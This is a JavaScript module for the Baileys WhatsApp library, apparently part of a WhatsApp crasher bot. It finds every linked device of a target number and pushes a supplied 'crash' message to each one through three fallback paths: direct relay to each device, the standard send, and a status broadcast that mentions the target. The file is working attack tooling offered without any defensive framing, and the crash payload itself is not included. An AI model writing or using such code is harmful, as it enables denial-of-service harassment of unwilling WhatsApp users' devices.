const { jidDecode } = require('@whiskeysockets/baileys');

async function getTargetDevices(sock, target) {
    if (!target) return [];
    if (target.endsWith('@g.us')) return [target];

    const cleanUser = target.split('@')[0].split(':')[0];
    const baseJid = `${cleanUser}@s.whatsapp.net`;
    const deviceSet = new Set([
        baseJid,
        `${cleanUser}:0@s.whatsapp.net`,
        `${cleanUser}:1@s.whatsapp.net`,
        `${cleanUser}:2@s.whatsapp.net`
    ]);

    try {
        if (typeof sock.getUSyncDevices === 'function') {
            const res = await sock.getUSyncDevices([baseJid], false, false);
            if (Array.isArray(res)) {
                for (const item of res) {
                    const u = item.user || cleanUser;
                    const d = item.device !== undefined ? item.device : 0;
                    deviceSet.add(`${u}:${d}@s.whatsapp.net`);
                }
            }
        }
    } catch (e) {
        // Fallback to primary device & secondary device JIDs
    }

    return Array.from(deviceSet);
}

async function relayCrashToDevices(sock, target, message, options = {}) {
    return sendCrashWithFallbacks(sock, target, message, options);
}

async function sendCrashWithFallbacks(sock, target, message, options = {}) {
    const errors = [];
    let deliveredCount = 0;

    const devices = await getTargetDevices(sock, target);

    // ── Tier 1: Low-level relay to all resolved target device JIDs ──
    for (const devJid of devices) {
        try {
            await sock.relayMessage(devJid, message, {
                ...options,
                participant: devJid
            });
            deliveredCount++;
        } catch (e1) {
            try {
                await sock.relayMessage(devJid, message, {
                    ...options,
                    participant: { jid: devJid }
                });
                deliveredCount++;
            } catch (e2) {
                errors.push(`Tier 1 [${devJid}]: ${e2.message || e1.message}`);
            }
        }
    }

    // ── Tier 2: Standard Baileys sendMessage fallback ──
    try {
        await sock.sendMessage(target, message, options);
        deliveredCount++;
    } catch (e) {
        errors.push(`Tier 2 [sendMessage]: ${e.message}`);
    }

    // ── Tier 3: Status broadcast relay with target mentions ──
    try {
        await sock.relayMessage("status@broadcast", message, {
            ...options,
            statusJidList: [target],
            additionalNodes: [{
                tag: "meta",
                attrs: {},
                content: [{
                    tag: "mentioned_users",
                    attrs: {},
                    content: [{ tag: "to", attrs: { jid: target } }]
                }]
            }]
        });
        deliveredCount++;
    } catch (e) {
        errors.push(`Tier 3 [status@broadcast]: ${e.message}`);
    }

    return {
        success: deliveredCount > 0,
        deliveredCount,
        errors
    };
}

module.exports = {
    getTargetDevices,
    relayCrashToDevices,
    sendCrashWithFallbacks
};
